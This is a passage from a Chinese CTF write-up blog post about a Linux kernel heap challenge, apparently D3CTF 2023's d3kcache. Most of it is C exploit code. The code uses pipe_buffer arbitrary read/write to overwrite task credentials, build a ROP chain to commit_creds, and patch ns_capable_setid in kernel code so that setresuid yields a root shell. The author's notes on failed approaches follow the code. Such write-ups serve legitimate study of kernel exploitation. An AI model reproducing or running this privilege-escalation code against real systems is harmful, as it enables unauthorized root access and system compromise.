*)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">            tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>),</span><br><span class="line">                                    &amp;buf[<span class="number">512</span> * <span class="number">8</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">            <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> stack_addr_another;</span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">            pte_val = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            stack_addr_another = pte_val;</span><br><span class="line">            stack_addr_another &amp;= (~PAGE_ATTR_NX);</span><br><span class="line">            stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                rop[idx++] = RET + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">            rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">            rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">54</span> + kernel_offset;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">            rop[idx++] = user_cs;</span><br><span class="line">            rop[idx++] = user_rflags;</span><br><span class="line">            rop[idx++] = user_sp;</span><br><span class="line">            rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint64_t</span> stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *kcode_map;</span><br><span class="line">            <span class="keyword">size_t</span> dst_paddr, dst_vaddr;</span><br><span class="line"></span><br><span class="line">            kcode_map = mmap((<span class="keyword">void</span> *)<span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                             MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!kcode_map)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                kcode_map[i] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">                kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>, dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            dst_paddr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   dst_paddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pte_addr;</span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span>)) = dst_paddr | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) = (dst_paddr + <span class="number">0x1000</span>) | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">             * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>,</span><br><span class="line">                   <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span></span><br><span class="line">                   <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span></span><br><span class="line">                   <span class="string">&quot;\xc3&quot;</span>,</span><br><span class="line">                   <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="/images/image-20230524153518128.png"  alt="image-20230524153518128"><img   src="/images/image-20230524160032198.png"  alt="image-20230524160032198"><img   src="/images/image-20230524162232568.png"  alt="image-20230524162232568"></p>
<h3 id="æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•"><a href="#æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•" class="headerlink" title="æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•"></a>æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•</h3><p>å› ä¸ºå½“æ—¶æ³¨æ„åˆ°å­˜åœ¨<code>off by null</code>æ¼æ´ï¼Œç¬¬ä¸€ååº”å°±æ˜¯åˆ©ç”¨<code>msg_msg</code>ç»“æ„ä½“æ¥åšè¿™é“é¢˜ã€‚å±äºæ˜¯ççŒ«ç¢°åˆ°æ­»è€—å­ï¼Œæˆ‘åœ¨æ²¡æœ‰è€ƒè™‘é¡µçº§å †é£æ°´çš„æƒ…å†µä¸‹ç”³è¯·çš„<code>msg_msg</code>çš„<code>order</code>æ­£å¥½ä¸º3ï¼Œä¹Ÿå¯¼è‡´æœ‰ä¸€å®šçš„å‡ ç‡èƒ½å¤Ÿè¾¾åˆ°UAFçš„æ•ˆæœã€‚è‡ªç„¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”ä¹Ÿæ˜¯ä¿®æ”¹<code>cred</code>ç»“æ„ä½“ï¼Œè™½ç„¶èƒ½å¤ŸæˆåŠŸæ‰¾åˆ°ä½†æ˜¯æˆåŠŸç‡ååˆ†çš„ä½ï¼Œæ¯æ¬¡è°ƒè¯•éœ€è¦æ‰‹åŠ¨è·‘äºŒåå¤šåˆ†é’Ÿï¼Œå› ä¸ºå†…å­˜ä¸­æœ‰ä¸€å¤§å—å­˜æ”¾ç€å„ç§æŒ‡é’ˆï¼Œå¯¼è‡´æ— æ³•ç»§ç»­å¾€ä¸‹æœç´¢å‡ºç°<code>kernel panic</code>ï¼Œå¹¶ä¸”åœ¨æ”¹å›æ™®é€šç”¨æˆ·æƒé™åå‡ºç°äº†è¿™ç¯‡æ–‡ç« å¼€å¤´éƒ¨åˆ†æåˆ°çš„<code>io_uring</code>çš„é—®é¢˜ï¼Œæ‰€ä»¥ä¹Ÿå°±æ”¾å¼ƒäº†è¿™ä¸€æ–¹æ³•ã€‚</p>
<p>ç„¶è€Œï¼Œå› ä¸ºå½“æ—¶ä¸æ¸…æ¥šCFIçš„ä½œç”¨åˆè·‘å»æ”¹opså»äº†ï¼Œè°ƒäº†åŠå¤©å‘ç°æ°¸è¿œä¼šåœ¨æœ€åä¸€æ­¥é€ æˆ<code>panic</code>ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç”¨æ¥å®ç°æ ˆè¿ç§»çš„<code>gadget</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¹Ÿè¢«æ”¾å¼ƒäº†ã€‚åˆšåˆšç»“æŸæ¯”èµ›çœ‹äº†NULLçš„wpä¹‹åå°±è§‰å¾—è‡ªå·±æ˜¯çœŸçš„å¤ªè ¢äº†ï¼Œåˆ†æ˜å¯ä»¥ç›´æ¥ä¿®æ”¹<code>pipe_buffer</code>äº†å±…ç„¶æ²¡æœ‰æƒ³åˆ°<code>Dirty Pipe</code>ï¼Œè™½ç„¶å¢¨æ™šé¸¢ä½¬è¯´è¿™ä¸æ˜¯æœ€ä¼˜è§£ï¼Œä½†æ˜¯æ˜¯æˆ‘å”¯ä¸€èƒ½å¤Ÿåšå‡ºæ¥çš„æ–¹æ³•æˆ‘å±…ç„¶æ²¡æƒ³åˆ°ï¼Œæˆ‘æ˜¯çœŸçš„è ¢ï¼ï¼ï¼</p>
<hr>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation" >https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.2.12/source" >https://elixir.bootlin.com/linux/v6.2.12/source<i class="fas fa-external-link-alt"></i></a></p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/msg-msg/">msg_msg</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pipe-buffer/">pipe_buffer</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/io-uring/">io_uring</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/">é¡µçº§å †é£æ°´</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                
                    

<div class="reward-author-container border-box flex-center">
    <div class="reward-btn border-box flex-center tooltip tooltip-img"
            data-tooltip-img-url="/images/reward.jpg"
            data-tooltip-img-trigger="click"
            data-tooltip-img-style="top: -6px;"
    >
        <i class="fa-solid fa-mug-hot"></i>&nbsp;æ¿€åŠ±ç‰›é©¬ï¼ŒåŠ é€Ÿåˆ›ä½œï¼
    </div>
</div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2023/05/30/protobuf/"
                                   title="å…³äºprotobufçš„è§£é¢˜æ­¥éª¤"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">å…³äºprotobufçš„è§£é¢˜æ­¥éª¤</span>
                                        <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/"
                                   title="RCTF2022å¤ç°"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">RCTF2022å¤ç°</span>
                                        <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;è¯„è®º
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">è¯„è®ºæ’ä»¶åŠ è½½å¤±è´¥</span>
    <button class="reload keep-button">ç‚¹å‡»é‡æ–°åŠ è½½</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">æ­£åœ¨åŠ è½½è¯„è®ºæ’ä»¶</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="valine-container">
        <div id="vcomments"></div>
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        ></script>
        <script 
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        >
          window.KeepCommentPlugin.initValine = () => {
            const config = {
              el: '#vcomments',
              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
              appKey: 'C672AAYGXMkHxztf8ntdLShs',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®º',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            if (window?.Valine) {
              new Valine(config)
              window.KeepCommentPlugin.hideLoading()
            } else {
              setTimeout(() => {
                window.KeepCommentPlugin.initValine()
              }, 1000)
            }
          }

          if ('false' === 'true') {
            setTimeout(() => {
              window.KeepCommentPlugin.initValine()
            }, 1200)
          } else {
            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
          }
        </script>
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#io-uring%E5%9C%A8%E5%A0%86%E5%96%B7%E4%B8%AD%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-text">io_uringåœ¨å †å–·ä¸­çš„å±€é™æ€§</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#slab%E5%88%86%E9%85%8D%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">slabåˆ†é…æºç åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kmem-cache-create-usercopy%E6%B5%81%E7%A8%8B"><span class="nav-text">kmem_cache_create_usercopyæµç¨‹</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#calculate-sizes%E5%87%BD%E6%95%B0"><span class="nav-text">calculate_sizeså‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calculate-order%E5%87%BD%E6%95%B0"><span class="nav-text">calculate_orderå‡½æ•°</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#calc-slab-order%E5%87%BD%E6%95%B0"><span class="nav-text">calc_slab_orderå‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kmem-cache-alloc%E6%B5%81%E7%A8%8B"><span class="nav-text">kmem_cache_allocæµç¨‹</span></a><ol 